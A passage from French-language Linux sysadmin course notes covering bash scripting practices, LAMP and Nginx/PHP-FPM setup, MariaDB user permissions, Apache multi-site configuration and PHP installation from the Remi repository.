if mysql -u"$DB_USER" -p"$DB_PASS" -e "USE $DB_NAME" 2>/dev/null; then
    echo "Database exists"
else
    echo "Database does not exist"
    mysql -u"$DB_USER" -p"$DB_PASS" -e "CREATE DATABASE $DB_NAME"
fi
```

### Redirection stderr

**2>&1** : Redirige stderr (2) vers stdout (1)
```bash
command 2>&1          # Erreurs + output normal ensemble
command 2>/dev/null   # Supprime messages erreur
command > file 2>&1   # Tout dans fichier
```

**Utilité scripts** :
```bash
# Capturer erreurs
error=$(commande 2>&1)

# Tester succès/échec commande
if [[ -z $(mysql -e "USE db" 2>&1) ]]; then
    echo "Database accessible"
fi
```

### Variables et quoting

**Déclaration** :
```bash
var="value"
readonly VAR="constant"    # Constante
```

**Expansion** :
```bash
echo "$var"          # Avec expansion variables
echo '$var'          # Littéral (pas expansion)
echo "Path: ${var}/subdir"  # Délimitation explicite
```

**Default values** :
```bash
${var:-default}      # Si var vide, utilise default (var inchangée)
${var:=default}      # Si var vide, assigne default à var
${var:?error msg}    # Si var vide, affiche erreur et exit
```

### Automation best practices

**Shebang** :
```bash
#!/bin/bash
# ou
#!/usr/bin/env bash    # Portable
```

**set options (sécurité)** :
```bash
set -e          # Exit si commande échoue
set -u          # Exit si variable non définie
set -o pipefail # Pipeline fail si une commande échoue

# Combiné
set -euo pipefail
```

**Logging** :
```bash
LOG_FILE="/var/log/script.log"

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*" | tee -a "$LOG_FILE"
}

log "Script démarré"
log "Database créée : $DB_NAME"
```

**Credentials sécurisées** :
```bash
# ❌ ÉVITER : Hardcoded passwords
DB_PASS="password123"

# ✅ Variables environnement
DB_PASS="${DB_PASSWORD}"

# ✅ Fichier config (permissions 600)
source /etc/myapp/db.conf

# ✅ MySQL config file
[client]
user=root
password=secret

# Script utilise
mysql --defaults-file=/etc/mysql/client.cnf -e "SHOW DATABASES"
```

**Error handling** :
```bash
if ! mysql -e "CREATE DATABASE $DB_NAME" 2>/dev/null; then
    echo "Erreur création database" >&2
    exit 1
fi
```

### Exemple complet : Database backup automation

```bash
#!/bin/bash
set -euo pipefail

# Configuration
BACKUP_DIR="/opt/backups/mysql"
RETENTION_DAYS=7
DB_USER="backup_user"
DB_PASS="${MYSQL_BACKUP_PASSWORD}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

# Logging
log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*"
}

# Créer répertoire backup
mkdir -p "$BACKUP_DIR"

# Liste databases
databases=$(mysql -u"$DB_USER" -p"$DB_PASS" -Nse "SHOW DATABASES" | grep -Ev '^(information_schema|performance_schema|mysql|sys)$')

# Backup chaque database
for db in $databases; do
    backup_file="${BACKUP_DIR}/${db}_${TIMESTAMP}.sql.gz"
    
    log "Backup $db..."
    if mysqldump -u"$DB_USER" -p"$DB_PASS" "$db" | gzip > "$backup_file"; then
        log "✓ Backup réussi : $backup_file"
    else
        log "✗ Échec backup : $db" >&2
    fi
done

# Suppression backups anciens
log "Nettoyage backups > $RETENTION_DAYS jours..."
find "$BACKUP_DIR" -name "*.sql.gz" -mtime +$RETENTION_DAYS -delete

log "Backup terminé"
```

### Bonnes pratiques scripts production

✅ **Shebang + set -euo pipefail** : Robustesse  
✅ **Logging systématique** : Traçabilité opérations  
✅ **Error handling** : Tester retours commandes  
✅ **Credentials externes** : Pas hardcoded, config files/env vars  
✅ **Permissions restrictives** : `chmod 700` scripts sensibles  
✅ **Idempotence** : Script exécutable plusieurs fois sans effet bord  
✅ **Comments** : Documenter logique complexe  
✅ **Testing** : ShellCheck linter, tests unitaires  

---

## Module 27 : LAMP Stack (Linux, Apache, MySQL, PHP)

### Architecture LAMP

**Stack components** :
- **L**inux : OS (CentOS, Ubuntu, Debian)
- **A**pache : Serveur web HTTP
- **M**ySQL/MariaDB : Base de données relationnelle
- **P**HP : Langage scripting côté serveur

**vs LEMP** : Apache au lieu de Nginx (flexibilité .htaccess, modules riches)

### Apache Modules

**MPM (Multi-Processing Modules)** :
- **prefork** : Processus isolés (1 thread/processus) - Compatible PHP non-thread-safe
- **worker** : Threads multiples par processus - Performances, moins RAM
- **event** : Worker amélioré, gestion événements asynchrone (Apache 2.4+)

**mod_php vs PHP-FPM** :

| Critère | **mod_php** | **PHP-FPM** |
|---------|-------------|-------------|
| Intégration | Module Apache intégré | Processus externe |
| Performances | Bonnes (mémoire partagée) | Excellentes (pool workers) |
| Scalabilité | Processus Apache = PHP | Pool PHP dédié |
| Configuration | Fichier Apache | php-fpm.conf séparé |
| Utilisation RAM | Haute (Apache + PHP ensemble) | Optimisée (séparation) |

**Recommandation moderne** : PHP-FPM (flexibilité, performances)

### Apache + PHP-FPM Configuration

**Installation packages** :
```bash
# RHEL/CentOS
sudo yum install httpd php-fpm php-mysqlnd -y

# Debian/Ubuntu
sudo apt install apache2 php-fpm php-mysql -y
```

**Modules Apache requis** :
```bash
# Activer mod_proxy_fcgi (déjà actif CentOS 7+)
sudo a2enmod proxy_fcgi  # Debian/Ubuntu
```

**Configuration VirtualHost** :
```apache
<VirtualHost *:80>
    ServerName example.com
    DocumentRoot /var/www/html
    DirectoryIndex index.php index.html
    
    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    # PHP-FPM via mod_proxy_fcgi
    <IfModule proxy_fcgi_module>
        <FilesMatch ".+\.ph(ar|p|tml)$">
            SetHandler "proxy:unix:/run/php-fpm/www.sock|fcgi://localhost"
        </FilesMatch>
    </IfModule>
    
    ErrorLog /var/log/httpd/example-error.log
    CustomLog /var/log/httpd/example-access.log combined
</VirtualHost>
```

**Explication directives** :

**DocumentRoot** :
- Répertoire racine site web
- Chemins absolus obligatoires

**DirectoryIndex** :
- Ordre priorité fichiers index
- `index.php` avant `index.html` pour apps PHP

**Options** :
- `-Indexes` : Désactive listing répertoires (sécurité)
- `+FollowSymLinks` : Autorise liens symboliques

**AllowOverride All** :
- Autorise `.htaccess` override configuration Apache
- `None` = `.htaccess` ignoré (performances production)

**FilesMatch Regex** :
- `.+\.ph(ar|p|tml)$` : Match `.php`, `.phar`, `.phtml`
- Envoie vers PHP-FPM via socket Unix

**SetHandler proxy** :
- `proxy:unix:/run/php-fpm/www.sock` : Socket Unix
- `|fcgi://localhost` : Protocole FastCGI

### Configuration PHP Extensions

**php.ini** : `/etc/php.ini` (principal) + `/etc/php.d/*.ini` (modules)

**Extension mysqli (MySQL Native Driver)** :
```ini
# /etc/php.ini ou /etc/php.d/mysqli.ini
extension=mysqli
```

**Vérifier extension chargée** :
```bash
php -m | grep mysqli
# mysqli

# ou
php -i | grep mysqli
```

**Extensions courantes WordPress/PHP** :
```ini
extension=mysqli        # MySQL/MariaDB
extension=gd            # Images (GD library)
extension=curl          # HTTP requests
extension=mbstring      # Multi-byte strings (UTF-8)
extension=xml           # XML parsing
extension=zip           # Archives ZIP
extension=json          # JSON (built-in PHP 8+)
```

### MariaDB Configuration

**MariaDB** = Fork MySQL (GPL pure, drop-in replacement)
- Créé par auteur original MySQL (Michael "Monty" Widenius)
- Compatible 100% MySQL (même protocole, API)
- Défaut RHEL/CentOS depuis v7

**Installation** :
```bash
sudo yum install mariadb-server -y
```

**Configuration bind-address** :

**Fichier** : `/etc/my.cnf.d/mariadb-server.cnf` ou `/etc/my.cnf`

```ini
[mysqld]
bind-address = 0.0.0.0
```

**bind-address options** :
- `127.0.0.1` : Écoute localhost uniquement (défaut, sécurisé)
- `0.0.0.0` : Écoute toutes interfaces (accès réseau distant)
- `10.0.1.5` : Écoute interface spécifique

**⚠️ Sécurité bind-address 0.0.0.0** :
- Exposition réseau = risque attaques
- Combiner avec :
  * Firewall restrictif (port 3306 limité IPs)
  * Users `'@'host_specific'` (pas `'@'%'` pour tous)
  * SSL/TLS connexions (chiffrement)

**Création database et user** :
```sql
CREATE DATABASE myapp_db;

CREATE USER 'myapp_user'@'%' IDENTIFIED BY 'strong_password';

GRANT ALL PRIVILEGES ON myapp_db.* TO 'myapp_user'@'%';

FLUSH PRIVILEGES;
```

**User host patterns** :
- `'user'@'%'` : Depuis n'importe où (⚠️ risque)
- `'user'@'localhost'` : Connexions locales Unix socket
- `'user'@'127.0.0.1'` : Connexions locales TCP
- `'user'@'192.168.1.%'` : Subnet 192.168.1.0/24
- `'user'@'app%.example.com'` : Pattern hostname

### Architecture Multi-Tier LAMP

**Typical 3-tier architecture** :
```
                    ┌────────────────┐
                    │ Load Balancer  │  (Tier 0 - Nginx/HAProxy)
                    │    (stlb01)    │
                    └────────┬───────┘
                             │
         ┌───────────────────┼───────────────────┐
         │                   │                   │
    ┌────▼────┐         ┌────▼────┐         ┌────▼────┐
    │ App 1   │         │ App 2   │         │ App 3   │  (Tier 1 - Web/App)
    │ Apache  │         │ Apache  │         │ Apache  │
    │ PHP-FPM │         │ PHP-FPM │         │ PHP-FPM │
    │(stapp01)│         │(stapp02)│         │(stapp03)│
    └────┬────┘         └────┬────┘         └────┬────┘
         │                   │                   │
         └───────────────────┼───────────────────┘
                             │
                    ┌────────▼───────┐
                    │   Database     │  (Tier 2 - Data)
                    │   MariaDB      │
                    │    (stdb01)    │
                    └────────────────┘
```

**Shared storage (NFS/GlusterFS)** :
```
┌──────────────────┐
│  Storage Server  │  (NFS/GlusterFS)
│  /var/www/html   │
└────────┬─────────┘
         │ (mount)
    ┌────┼────┬────┐
    │    │    │    │
  App1 App2 App3  ...
  /var/www/html (mounted)
```

**Avantages** :
- Fichiers centralisés (uploads, code)
- Déploiement simplifié (1 copie → tous serveurs)
- Stateless app servers (scalabilité)

### Port Custom Apache

**Modifier port écoute** :
```apache
# /etc/httpd/conf/httpd.conf
Listen 5000
```

**VirtualHost correspondant** :
```apache
<VirtualHost *:5000>
    ServerName example.com
    # ...
</VirtualHost>
```

**SELinux (RHEL/CentOS)** :
```bash
# Autoriser Apache port custom
sudo semanage port -a -t http_port_t -p tcp 5000

# Vérifier
sudo semanage port -l | grep http_port_t
```

**Firewall** :
```bash
# Ouvrir port 5000
sudo firewall-cmd --permanent --add-port=5000/tcp
sudo firewall-cmd --reload
```

### Troubleshooting LAMP

**Problème 1 : PHP non exécuté (téléchargé)** :
```
Symptôme : Navigateur télécharge fichier .php
Cause : Apache ne passe pas à PHP-FPM
```

**Solutions** :
```bash
# Vérifier module proxy_fcgi
httpd -M | grep proxy_fcgi
# proxy_fcgi_module (shared)

# Vérifier FilesMatch dans VirtualHost
grep -A 3 "FilesMatch.*php" /etc/httpd/conf.d/*.conf

# Vérifier PHP-FPM actif
sudo systemctl status php-fpm
```

**Problème 2 : 502 Bad Gateway PHP** :
```
Symptôme : Erreur 502 pages PHP
Cause : Socket PHP-FPM inaccessible
```

**Solutions** :
```bash
# Vérifier socket existe
ls -l /run/php-fpm/www.sock

# Vérifier permissions
# user/group Apache (centos/apache) doit accéder socket

# Vérifier config PHP-FPM listen
grep "^listen" /etc/php-fpm.d/www.conf
# listen = /run/php-fpm/www.sock

# Vérifier listen.owner/group match Apache
grep "^listen.owner" /etc/php-fpm.d/www.conf
# listen.owner = apache
# listen.group = apache
```

**Problème 3 : Cannot connect to database** :
```
Symptôme : PHP erreur connexion MySQL
Cause : Extension mysqli manquante ou DB inaccessible
```

**Solutions** :
```bash
# Vérifier extension mysqli
php -m | grep mysqli

# Si absente
sudo vi /etc/php.ini
# extension=mysqli

sudo systemctl restart php-fpm

# Tester connexion DB depuis app server
mysql -h db_host -u user -p'password' -e "SELECT 1;"
```

**Problème 4 : Access denied for user** :
```
Symptôme : ERROR 1045 (28000): Access denied
Cause : User pas autorisé depuis host app server
```

**Solutions** :
```sql
-- Vérifier users autorisés
SELECT user, host FROM mysql.user WHERE user='myapp_user';

-- Si host incorrect, créer user correct
CREATE USER 'myapp_user'@'192.168.1.%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON myapp_db.* TO 'myapp_user'@'192.168.1.%';
FLUSH PRIVILEGES;
```

### Vérification End-to-End

**1. Tester Apache** :
```bash
curl http://localhost:5000
# Devrait afficher HTML
```

**2. Tester PHP** :
```bash
echo "<?php phpinfo(); ?>" | sudo tee /var/www/html/info.php
curl http://localhost:5000/info.php
# Devrait afficher page PHP info
```

**3. Tester connexion DB** :
```php
<?php
$conn = new mysqli('db_host', 'user', 'password', 'database');
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}
echo "Connected successfully";
?>
```

```bash
curl http://localhost:5000/test_db.php
# Connected successfully
```

### Bonnes pratiques LAMP

✅ **PHP-FPM over mod_php** : Performances, isolation  
✅ **AllowOverride None production** : Performances (pas lecture .htaccess)  
✅ **Disable directory indexes** : `Options -Indexes` (sécurité)  
✅ **User permissions restrictives** : Database users host-specific  
✅ **bind-address restrictif** : Localhost ou IP privée uniquement  
✅ **Extensions PHP minimales** : Activer uniquement nécessaires  
✅ **Logs séparés VirtualHost** : ErrorLog/CustomLog par site  
✅ **SSL/TLS production** : Let's Encrypt, redirect HTTP→HTTPS  

❌ **mod_php production moderne** : Performances inférieures PHP-FPM  
❌ **bind-address 0.0.0.0 sans firewall** : Exposition attaques  
❌ **User @'%' sans restriction** : Accès global database  
❌ **AllowOverride All production** : Performance hit  
❌ **Default passwords** : root sans password, users faibles  

### Outils administration

**Apache** :
```bash
# Test config
sudo httpd -t
sudo apachectl configtest

# Lister modules
httpd -M

# Reload config (pas downtime)
sudo systemctl reload httpd

# Logs temps réel
sudo tail -f /var/log/httpd/error_log
```

**MariaDB** :
```bash
# Sécurisation initiale
sudo mysql_secure_installation

# Connexion admin
sudo mysql

# Backup database
mysqldump -u root -p database > backup.sql

# Restore
mysql -u root -p database < backup.sql

# Monitoring
mysqladmin -u root -p processlist
mysqladmin -u root -p status
```

**PHP** :
```bash
# Version
php -v

# Modules chargés
php -m

# Configuration
php -i | grep "Configuration File"

# Test syntax
php -l script.php
```

---

## Module 28 : MariaDB User Management & Permissions

### Installation MariaDB

**RHEL/CentOS** :
```bash
sudo yum install mariadb-server -y
sudo systemctl enable --now mariadb
```

**Debian/Ubuntu** :
```bash
sudo apt install mariadb-server -y
sudo systemctl enable --now mariadb
```

**Sécurisation initiale** :
```bash
sudo mysql_secure_installation
```
Prompts : root password, remove anonymous users, disable root remote login, remove test database.

---

### Connexion root initiale

**Socket authentication** (par défaut) :
```bash
sudo mysql
# ou
sudo mysql -u root
```

**Fonctionnement** :
- Plugin `unix_socket` au lieu de `mysql_native_password`
- User Unix `root` → User MariaDB `root` sans password
- Sécurisé : pas d'accès network root

**Password authentication** (optionnel) :
```sql
ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword';
FLUSH PRIVILEGES;
```

---

### Gestion utilisateurs

**Créer utilisateur** :
```sql
CREATE USER 'username'@'host' IDENTIFIED BY 'password';
```

**Hosts patterns** :
- `'user'@'localhost'` : Connexions locales Unix socket
- `'user'@'127.0.0.1'` : Connexions TCP localhost
- `'user'@'192.168.1.50'` : IP spécifique
- `'user'@'192.168.1.%'` : Subnet (wildcard %)
- `'user'@'%'` : N'importe quelle IP (éviter production)

**Modifier password** :
```sql
ALTER USER 'username'@'host' IDENTIFIED BY 'NewPassword';
SET PASSWORD FOR 'username'@'host' = PASSWORD('NewPassword');  -- Legacy
```

**Supprimer utilisateur** :
```sql
DROP USER 'username'@'host';
```

**Lister utilisateurs** :
```sql
SELECT user, host, plugin FROM mysql.user;
```

---

### Permissions (GRANT)

**Structure** :
```sql
GRANT privileges ON database.table TO 'user'@'host';
```

**Privileges principaux** :
- `ALL PRIVILEGES` : Toutes permissions (équivalent admin database)
- `SELECT` : Lecture
- `INSERT` : Insertion
- `UPDATE` : Modification
- `DELETE` : Suppression
- `CREATE` : Créer tables/databases
- `DROP` : Supprimer tables/databases
- `ALTER` : Modifier structure tables
- `INDEX` : Créer/supprimer index
- `GRANT OPTION` : Accorder permissions à d'autres users

**Scopes** :
- `*.*` : Toutes databases, toutes tables (global)
- `database.*` : Database spécifique, toutes tables
- `database.table` : Table spécifique

**Exemples** :
```sql
-- Admin complet database
GRANT ALL PRIVILEGES ON mydb.* TO 'admin'@'localhost';

-- Lecture seule
GRANT SELECT ON mydb.* TO 'readonly'@'%';

-- Application CRUD
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app_user'@'192.168.1.%';

-- Backup user
GRANT SELECT, LOCK TABLES, SHOW VIEW ON *.* TO 'backup'@'localhost';
```

**Révoquer permissions** :
```sql
REVOKE ALL PRIVILEGES ON database.* FROM 'user'@'host';
REVOKE SELECT ON database.table FROM 'user'@'host';
```

**Appliquer changements** :
```sql
FLUSH PRIVILEGES;
```
⚠️ Requis après modifications directes table `mysql.user`, pas après `GRANT/REVOKE`.

---

### Gestion databases

```sql
-- Créer database
CREATE DATABASE dbname;
CREATE DATABASE IF NOT EXISTS dbname;

-- Character set custom
CREATE DATABASE dbname CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- Lister databases
SHOW DATABASES;

-- Utiliser database
USE dbname;

-- Supprimer database
DROP DATABASE dbname;
DROP DATABASE IF EXISTS dbname;
```

---

### Vérification permissions

**Permissions user** :
```sql
SHOW GRANTS FOR 'username'@'host';
SHOW GRANTS FOR CURRENT_USER();
```

**Permissions effectives** :
```bash
# Tester connexion
mysql -u username -p -h hostname
mysql -u username -p -h 192.168.1.50

# Lister databases accessibles
mysql -u username -p -e "SHOW DATABASES;"
```

---

### Configuration réseau

**Fichier** : `/etc/my.cnf` ou `/etc/mysql/mariadb.conf.d/50-server.cnf`

**Bind address** :
```ini
[mysqld]
# Écoute localhost uniquement (défaut)
bind-address = 127.0.0.1

# Écoute toutes interfaces
bind-address = 0.0.0.0

# Écoute IP spécifique
bind-address = 192.168.1.100
```

**Port** :
```ini
[mysqld]
port = 3306  # Défaut
```

**Redémarrer après modification** :
```bash
sudo systemctl restart mariadb
```

**Vérifier écoute** :
```bash
sudo ss -tlnp | grep mysql
# tcp   LISTEN 0.0.0.0:3306  0.0.0.0:*    users:(("mysqld",pid=1234))
```

---

### Firewall (accès distant)

**firewalld** :
```bash
sudo firewall-cmd --permanent --add-service=mysql
sudo firewall-cmd --reload
```

**iptables** :
```bash
sudo iptables -A INPUT -p tcp --dport 3306 -j ACCEPT
sudo iptables-save > /etc/iptables/rules.v4
```

**Sécurité** :
- Limiter sources : `--source 192.168.1.0/24`
- Éviter `bind-address = 0.0.0.0` + `user@'%'` en production
- Préférer connexions locales ou VPN

---

### Troubleshooting

**Erreur connexion** :
```bash
ERROR 1045 (28000): Access denied for user 'user'@'host'
```
Causes :
- Password incorrect
- User n'existe pas pour ce host (`'user'@'192.168.1.50'` ≠ `'user'@'%'`)
- Permissions insuffisantes

**Vérifier** :
```sql
SELECT user, host FROM mysql.user WHERE user='username';
```

**Erreur host resolution** :
```bash
ERROR 2005 (HY000): Unknown MySQL server host 'hostname'
```
Solution : Utiliser IP au lieu hostname ou configurer `/etc/hosts`.

**Can't connect to socket** :
```bash
ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock'
```
Causes :
- MariaDB pas démarré : `sudo systemctl status mariadb`
- Socket path incorrect : Vérifier `my.cnf` → `socket`

**Performance** :
```sql
-- Connexions actives
SHOW PROCESSLIST;

-- Variables système
SHOW VARIABLES LIKE 'max_connections';

-- Status
SHOW STATUS LIKE 'Threads_connected';
```

---

### Bonnes pratiques

**Sécurité** :
- ❌ `GRANT ALL ON *.* TO 'user'@'%'` (trop permissif)
- ✅ Principe moindre privilège : Permissions minimales requises
- ✅ Host patterns restrictifs (`'%'` → `'192.168.1.%'`)
- ✅ Passwords forts (16+ caractères)

**Organisation** :
- User `root` : Admin système uniquement (local)
- User `admin_db` : Admin applicatif (création tables, ALTER)
- User `app_user` : Application (SELECT, INSERT, UPDATE, DELETE)
- User `readonly` : Monitoring, backup (SELECT)

**Documentation** :
```sql
-- Commenter permissions
-- App Web - CRUD orders table
GRANT SELECT, INSERT, UPDATE, DELETE ON shop.orders TO 'webapp'@'192.168.1.%';
```

---

## Module 29 : Apache Multi-Sites & Virtual Directories

### Concepts

**DocumentRoot** : Répertoire racine site web.
```apache
DocumentRoot "/var/www/html"
```

**Mapping URL → Filesystem** :
- URL `/` → `/var/www/html/`
- URL `/images/logo.png` → `/var/www/html/images/logo.png`
- URL `/news/` → `/var/www/html/news/` (si répertoire existe)

**Sous-répertoires** : Pas besoin VirtualHost ni Alias.
```bash
# Structure
/var/www/html/
├── index.html
├── news/
│   └── index.html
└── blog/
    └── index.html

# URLs
http://example.com/          → /var/www/html/index.html
http://example.com/news/     → /var/www/html/news/index.html
http://example.com/blog/     → /var/www/html/blog/index.html
```

---

### Configuration port custom

**Fichier** : `/etc/httpd/conf/httpd.conf`

```apache
# Port défaut
Listen 80

# Port custom
Listen 8080
Listen 6200
```

**Multiple ports** :
```apache
Listen 80
Listen 443
Listen 8080
```

**Redémarrer Apache** :
```bash
sudo systemctl restart httpd
```

**Vérifier écoute** :
```bash
sudo ss -tlnp | grep httpd
# tcp   LISTEN 0.0.0.0:6200   0.0.0.0:*   users:(("httpd",pid=1234))
```

---

### Alias directive

**Mapping custom** (URL ≠ filesystem path) :
```apache
Alias "/docs" "/usr/share/doc"
```

**Exemple** :
```apache
<IfModule alias_module>
    Alias "/static" "/var/www/static-files"
    
    <Directory "/var/www/static-files">
        Require all granted
    </Directory>
</IfModule>
```

**URLs** :
- `http://example.com/static/image.png` → `/var/www/static-files/image.png`

**Cas usage** :
- Fichiers hors DocumentRoot (sécurité, organisation)
- Partage documentation (`/docs` → `/usr/share/doc`)

---

### Permissions répertoires

**User/Group Apache** :
- RHEL/CentOS : `apache:apache`
- Debian/Ubuntu : `www-data:www-data`

**Fichiers** :
```bash
# Propriétaire
sudo chown -R root:apache /var/www/html

# Permissions
sudo chmod -R 644 /var/www/html/*.html  # Fichiers
sudo chmod -R 755 /var/www/html/*/      # Répertoires
```

**Explication permissions** :
- `644` fichiers : Owner rw, groupe r, other r
- `755` répertoires : Owner rwx, groupe rx, other rx
- Groupe `apache` : Lecture suffisante (pas écriture)

**Upload directory** (écriture Apache) :
```bash
sudo mkdir /var/www/html/uploads
sudo chown :apache /var/www/html/uploads
sudo chmod 775 /var/www/html/uploads  # Groupe écriture
```

---

### SELinux contexts

**RHEL/CentOS** : Vérifier contextes SELinux.

```bash
# Vérifier context
ls -Z /var/www/html/
# httpd_sys_content_t

# Restaurer contexts par défaut
sudo restorecon -Rv /var/www/html/

# Context custom directory
sudo semanage fcontext -a -t httpd_sys_content_t "/var/www/custom(/.*)?"
sudo restorecon -Rv /var/www/custom
```

**Writable directory** (uploads) :
```bash
sudo semanage fcontext -a -t httpd_sys_rw_content_t "/var/www/html/uploads(/.*)?"
sudo restorecon -Rv /var/www/html/uploads
```

---

### Multi-sites via Directory

**Pas besoin VirtualHost** si même port + domaine.

**Configuration** :
```apache
DocumentRoot "/var/www/html"

<Directory "/var/www/html">
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>

<Directory "/var/www/html/admin">
    Options -Indexes
    AllowOverride All
    Require ip 192.168.1.0/24
</Directory>
```

**Options** :
- `Indexes` : Listing répertoires (⚠️ sécurité)
- `FollowSymLinks` : Suivre symlinks
- `-Indexes` : Désactiver listing

**AllowOverride** :
- `None` : .htaccess ignorés
- `All` : .htaccess activés

---

### Vérification configuration

```bash
# Syntax check
sudo apachectl configtest
# Syntax OK

# Restart
sudo systemctl restart httpd

# Logs errors
sudo tail -f /var/log/httpd/error_log

# Logs access
sudo tail -f /var/log/httpd/access_log
```

---

### Troubleshooting

**403 Forbidden** :
- Permissions filesystem incorrectes
- SELinux context incorrect
- Directive `Require` restrictive

```bash
# Permissions
ls -la /var/www/html/

# SELinux
ls -Z /var/www/html/
sudo tail -f /var/log/audit/audit.log | grep AVC

# Config Apache
sudo grep -r "Require" /etc/httpd/
```

**404 Not Found** :
- Path incorrect (case-sensitive Linux)
- DocumentRoot incorrect
- Alias mapping incorrect

```bash
# Vérifier paths
ls -la /var/www/html/news/

# Logs
sudo tail /var/log/httpd/error_log
```

**Port already in use** :
```bash
# Identifier processus
sudo ss -tlnp | grep :8080

# Arrêter conflit (ex: Nginx)
sudo systemctl stop nginx
```

---

## Module 30 : PHP Version Management avec Remi Repository

### Remi Repository

**Rôle** : Fournir versions récentes PHP (8.1, 8.2, 8.3) pour RHEL/CentOS.

**Versions disponibles** :
- **Repos officiels RHEL 9** : PHP 8.0
- **Remi** : PHP 8.1, 8.2, 8.3

---

### Installation Remi

**RHEL 9 / Rocky 9 / AlmaLinux 9** :
```bash
sudo dnf install https://rpms.remirepo.net/enterprise/remi-release-9.rpm
sudo dnf install dnf-utils
```

**RHEL 8** :
```bash
sudo dnf install https://rpms.remirepo.net/enterprise/remi-release-8.rpm
sudo dnf install dnf-utils
```

**EPEL** (dépendance Remi) :
```bash
# RHEL 9
sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm

# RHEL 8
sudo dnf install https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
```

---

### CodeReady Builder (CRB)

**Rôle** : Repository dépendances développement (headers, libs).

**RHEL 9** :
```bash
sudo crb enable
```

**RHEL 8** :
```bash
sudo dnf config-manager --set-enabled powertools
```

**Équivalent** : CRB (RHEL 9) = PowerTools (RHEL 8).

---

### PHP Modules (streams)

**Lister modules** :
```bash
dnf module list php
```

**Sortie exemple** :
```
Name     Stream      Profiles                    Summary
php      8.0 [d]     common, minimal             PHP scripting language
php      remi-8.1    common, minimal             PHP scripting language
php      remi-8.2    common, minimal             PHP scripting language
php      remi-8.3    common, minimal             PHP scripting language
```

**[d]** : Stream par défaut.

---

### Installation PHP version spécifique

**Réinitialiser module** (si version précédente) :
```bash
sudo dnf module reset php
```

**Installer version** :
```bash
# PHP 8.2
sudo dnf module install php:remi-8.2

# PHP 8.3
sudo dnf module install php:remi-8.3
```

**Switch entre versions** :
```bash
sudo dnf module switch-to php:remi-8.3
```

**Vérifier version** :
```bash
php -v
# PHP 8.3.x (cli)
```

---

### Installation PHP-FPM

**Inclus dans module** :
```bash
sudo dnf module install php:remi-8.2
# Installe PHP CLI + PHP-FPM
```

**Ou séparé** :
```bash
sudo dnf install php-fpm
```

**Extensions courantes** :
```bash
sudo dnf install php-mysqlnd php-gd php-mbstring php-xml php-zip
```

---

### Configuration PHP-FPM versions

**Fichier config** : `/etc/php-fpm.d/www.conf`

**Listen TCP vs Unix Socket** :
```ini
# TCP port 9000
listen = 9000

# Unix socket (défaut)
listen = /run/php-fpm/www.sock
```

**User/Group** :
```ini
# Apache
user = apache
group = apache

# Nginx
user = nginx
group = nginx
```

**Socket permissions** (si Unix socket) :
```ini
listen.owner = nginx
listen.group = nginx
listen.mode = 0660
```

---

### Conflit Apache/Nginx

**Problème** : Apache et Nginx écoutent port 80 par défaut.

**Solution 1** : Désinstaller Apache.
```bash
sudo yum remove httpd -y
```

**Solution 2** : Changer port Apache.
```apache
# /etc/httpd/conf/httpd.conf
Listen 8080
```

**Solution 3** : Désactiver Apache.
```bash
sudo systemctl disable --now httpd
```

---

### Troubleshooting

**Module not found** :
```bash
# Vérifier Remi installé
dnf repolist | grep remi

# Lister repos activés
dnf repolist enabled
```

**PHP-FPM not starting** :
```bash
# Status
sudo systemctl status php-fpm

# Logs
sudo journalctl -u php-fpm -n 50

# Vérifier config
php-fpm -t
```

**Wrong PHP version** :
```bash
# Vérifier module actif
dnf module list php

# Switch version
sudo dnf module switch-to php:remi-8.3
```

---

## Module 31 : Nginx + PHP-FPM avec Unix Socket

### Architecture

**Communication Nginx ↔ PHP-FPM** :
1. **TCP Socket** : `127.0.0.1:9000` (network stack)
2. **Unix Socket** : `/run/php-fpm/www.sock` (IPC)

**Unix Socket avantages** :
- ✅ Performances supérieures (pas TCP overhead)
- ✅ Sécurité (filesystem permissions)
- ✅ Pas de port réseau exposé

**TCP Socket avantages** :
- ✅ PHP-FPM distant (load balancing)
- ✅ Monitoring network (netstat, ss)

---

### Configuration PHP-FPM (Unix Socket)

**Fichier** : `/etc/php-fpm.d/www.conf`

```ini
[www]
; Unix socket
listen = /run/php-fpm/www.sock

; Permissions socket
listen.owner = nginx
listen.group = nginx
listen.mode = 0660

; User/Group process
user = nginx
group = nginx
```

**Socket custom path** :
```ini
listen = /var/run/php-fpm/default.sock
```

⚠️ **Répertoire parent doit exister** :
```bash
sudo mkdir -p /var/run/php-fpm
sudo chown :nginx /var/run/php-fpm
sudo chmod 775 /var/run/php-fpm
```

---

### Configuration Nginx

**FastCGI Unix Socket** :
```nginx
server {
    listen 80;
    server_name example.com;
    root /var/www/html;
    index index.php index.html;

    location ~ \.php$ {
        try_files $uri =404;
        fastcgi_pass unix:/run/php-fpm/www.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }
}
```

**Directives clés** :
- `fastcgi_pass unix:/path/to/socket.sock` : Chemin socket
- `try_files $uri =404` : Sécurité (404 si fichier inexistant)
- `SCRIPT_FILENAME $document_root$fastcgi_script_name` : Path absolu script PHP

---

### Permissions filesystem

**Socket Unix** :
- Propriétaire : `nginx` (ou `www-data` Debian)
- Groupe : `nginx`
- Permissions : `0660` (rw-rw----)

**Vérifier** :
```bash
ls -l /run/php-fpm/www.sock
# srw-rw---- 1 nginx nginx 0 Jan 20 10:00 www.sock
```

**Permissions répertoire** :
```bash
ls -ld /run/php-fpm/
# drwxrwxr-x 2 root nginx 4096 Jan 20 10:00 /run/php-fpm/
```

**Fix permissions** :
```bash
sudo chown nginx:nginx /run/php-fpm/www.sock
sudo chmod 660 /run/php-fpm/www.sock
```

---

### Démarrage services

